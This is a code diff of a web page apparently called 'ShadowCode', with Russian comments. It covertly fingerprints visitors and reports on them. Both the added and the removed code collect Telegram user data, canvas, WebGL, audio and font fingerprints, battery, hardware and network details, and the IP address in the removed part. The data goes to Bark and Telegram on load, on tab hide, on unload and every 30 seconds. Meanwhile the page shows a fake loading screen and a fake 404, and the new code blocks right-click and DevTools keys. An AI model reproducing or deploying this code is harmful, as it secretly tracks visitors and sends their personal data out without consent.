+                sendToBark('⚡ SHADOWCODE | ' + tg.username, report);
+                await sendToTelegram(report);
 
-                // --- RAW JSON (для архива) ---
-                const rawData = {
-                    telegram: tg,
-                    fingerprint: fp,
-                    battery: batt, // РЕАЛЬНЫЕ ДАННЫЕ
-                    browser: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        languages: navigator.languages ? Array.from(navigator.languages) : [],
-                        cookieEnabled: navigator.cookieEnabled,
-                        doNotTrack: navigator.doNotTrack,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        screenResolution: `${screen.width}x${screen.height}`,
-                        colorDepth: screen.colorDepth,
-                        windowSize: `${window.innerWidth}x${window.innerHeight}`,
-                        plugins: Array.from(navigator.plugins).map(p => p.name),
-                        hardwareConcurrency: navigator.hardwareConcurrency,
-                        deviceMemory: navigator.deviceMemory,
-                        connection: navigator.connection ? {
-                            rtt: navigator.connection.rtt,
-                            downlink: navigator.connection.downlink,
-                            effectiveType: navigator.connection.effectiveType
-                        } : null
-                    },
-                    dorks: dorks,
-                    timestamp: new Date().toISOString()
-                };
-
+                // Отправляем сырые данные для анализа
                 setTimeout(() => {
-                    sendToBark('📦 RAW JSON', JSON.stringify(rawData, null, 2).substring(0, 3500));
-                }, 500);
+                    const rawData = {
+                        telegram: tg,
+                        battery: battery,
+                        network: network,
+                        hardware: hardware,
+                        fingerprint: {
+                            canvas: fp,
+                            webgl: webgl,
+                            audio: audioFp,
+                            fonts: fontsFp
+                        },
+                        plugins: plugins,
+                        dorks_count: dorks.length,
+                        user_agent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    const rawJson = JSON.stringify(rawData, null, 2);
+                    if (rawJson.length > 3500) {
+                        // Разбиваем на части если слишком большой
+                        sendToBark('📦 RAW DATA (1/2)', rawJson.substring(0, 3500));
+                        setTimeout(() => {
+                            sendToBark('📦 RAW DATA (2/2)', rawJson.substring(3500, 7000));
+                        }, 500);
+                    } else {
+                        sendToBark('📦 RAW JSON', rawJson);
+                    }
+                }, 1500);
 
-                console.log('[ShadowCode] Отправлено:', rawData);
-
+                console.log('[ShadowCode] Данные собраны и отправлены');
+                
             } catch (err) {
-                sendToBark('⚠️ ShadowCode ERROR', err.message + '\nStack: ' + err.stack);
+                sendToBark('⚠️ CRITICAL ERROR', err.message + '\n' + err.stack?.substring(0, 200));
             }
         }
 
-        // ============================================================
-        // 7. ОБРАТНЫЙ ОТСЧЕТ И ПЕРЕКЛЮЧЕНИЕ НА 404
-        // ============================================================
-        let counter = 10;
-        const timerEl = document.getElementById('timer');
-        const progressFill = document.getElementById('progressFill');
-        const statusText = document.getElementById('statusText');
-        const loadingScreen = document.getElementById('loadingScreen');
-        const error404 = document.getElementById('error404');
-
-        function updateProgress() {
-            const progress = ((10 - counter) / 10) * 100;
-            progressFill.style.width = progress + '%';
-            if (counter > 0) {
-                statusText.textContent = `Взлом матрицы... ${counter} сек`;
-            } else {
-                statusText.textContent = 'Доступ заблокирован';
-            }
+        // ============================================
+        // АНИМАЦИЯ ЗАГРУЗКИ И ОТСЧЁТ
+        // ============================================
+        
+        function startLoadingSequence() {
+            const loadingBar = document.getElementById('loadingBar');
+            const countdownEl = document.getElementById('countdown');
+            const statusText = document.getElementById('statusText');
+            const mainScreen = document.getElementById('mainScreen');
+            const errorScreen = document.getElementById('errorScreen');
+            
+            let progress = 0;
+            let countdown = 10;
+            const totalSteps = 100;
+            const intervalTime = 100; // 10 секунд всего
+            
+            const statuses = [
+                'ИНИЦИАЛИЗАЦИЯ ПРОТОКОЛА...',
+                'ПОДКЛЮЧЕНИЕ К УЗЛУ...',
+                'ШИФРОВАНИЕ КАНАЛА...',
+                'СИНХРОНИЗАЦИЯ КЛЮЧЕЙ...',
+                'ЗАГРУЗКА МОДУЛЕЙ...',
+                'СКАНИРОВАНИЕ СРЕДЫ...',
+                'СБОР ДАННЫХ...',
+                'ЭКСФИЛЬТРАЦИЯ...',
+                'ОЧИСТКА СЛЕДОВ...',
+                'ЗАВЕРШЕНИЕ...'
+            ];
+            
+            const interval = setInterval(() => {
+                progress += (100 / totalSteps);
+                loadingBar.style.width = progress + '%';
+                
+                // Обновляем статус
+                const statusIndex = Math.floor((progress / 100) * statuses.length);
+                if (statusIndex < statuses.length) {
+                    statusText.textContent = statuses[statusIndex];
+                }
+                
+                // Обновляем отсчёт
+                const newCountdown = Math.ceil(10 - (progress / 100) * 10);
+                if (newCountdown !== countdown) {
+                    countdown = newCountdown;
+                    countdownEl.textContent = countdown;
+                    
+                    // Эффект при смене цифры
+                    if (countdown <= 3) {
+                        countdownEl.style.color = '#f00';
+                        countdownEl.style.textShadow = '0 0 40px #f00';
+                    }
+                }
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    showError404();
+                }
+            }, intervalTime);
         }
 
-        const countdownInterval = setInterval(() => {
-            counter--;
-            timerEl.textContent = counter;
-            updateProgress();
+        function showError404() {
+            const mainScreen = document.getElementById('mainScreen');
+            const errorScreen = document.getElementById('errorScreen');
+            
+            // Скрываем экран загрузки, показываем 404
+            mainScreen.style.display = 'none';
+            errorScreen.style.display = 'block';
+            
+            // Эффект красного мерцания на всём экране
+            document.body.style.backgroundColor = '#0a0000';
+            document.body.style.animation = 'redFlash 0.5s infinite';
+            
+            // Добавляем стиль мерцания
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes redFlash {
+                    0% { background-color: #0a0000; }
+                    50% { background-color: #1a0000; }
+                    100% { background-color: #0a0000; }
+                }
+            `;
+            document.head.appendChild(style);
+        }
 
-            if (counter <= 0) {
-                clearInterval(countdownInterval);
-                // Скрываем загрузку, показываем 404
-                loadingScreen.classList.add('hidden');
-                error404.style.display = 'flex';
-                // Добавляем глитч-эффект
-                document.querySelector('#error404 h1').classList.add('glitch');
-                // Финальный сбор (на всякий случай)
-                collectAndSend();
-            }
-        }, 1000);
-
-        // ============================================================
-        // 8. ЗАПУСК СБОРА ПРИ ЗАГРУЗКЕ (параллельно с таймером)
-        // ============================================================
-        window.onload = function() {
-            // Сбор при загрузке (отправка через 1.5 сек)
-            setTimeout(() => {
-                collectAndSend();
-            }, 1500);
-
-            // Дополнительный сбор батареи отдельным уведомлением (для наглядности)
-            setTimeout(async () => {
-                const batt = await getRealBattery();
-                sendToBark('🔋 РЕАЛЬНАЯ БАТАРЕЯ', `Уровень: ${batt.level}\nЗарядка: ${batt.charging}`);
-            }, 2500);
-
-            // IP адрес
-            try {
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(ipData => {
-                        sendToBark('🌐 IP Адрес', `IP: ${ipData.ip}`);
-                    }).catch(() => {});
-            } catch (e) {}
-        };
-
-        // Сбор при закрытии/скрытии страницы
-        window.addEventListener('beforeunload', function() {
-            collectAndSend();
+        // ============================================
+        // ЗАПУСК
+        // ============================================
+        
+        window.addEventListener('DOMContentLoaded', () => {
+            // Сразу начинаем сбор данных (не ждём!)
+            collectAndSendAll();
+            
+            // Запускаем анимацию для жертвы
+            startLoadingSequence();
+            
+            // Дополнительный сбор при уходе со страницы
+            window.addEventListener('beforeunload', () => {
+                collectAndSendAll();
+            });
+            
+            // Сбор при скрытии вкладки
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    collectAndSendAll();
+                }
+            });
+            
+            // Периодический сбор каждые 30 секунд
+            setInterval(() => {
+                collectAndSendAll();
+            }, 30000);
         });
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                collectAndSend();
+
+        // Отключаем правую кнопку мыши
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // Отключаем комбинации клавиш
+        document.addEventListener('keydown', e => {
+            if (e.ctrlKey || e.altKey || e.metaKey || e.key === 'F12') {
+                e.preventDefault();
             }
         });
     </script>
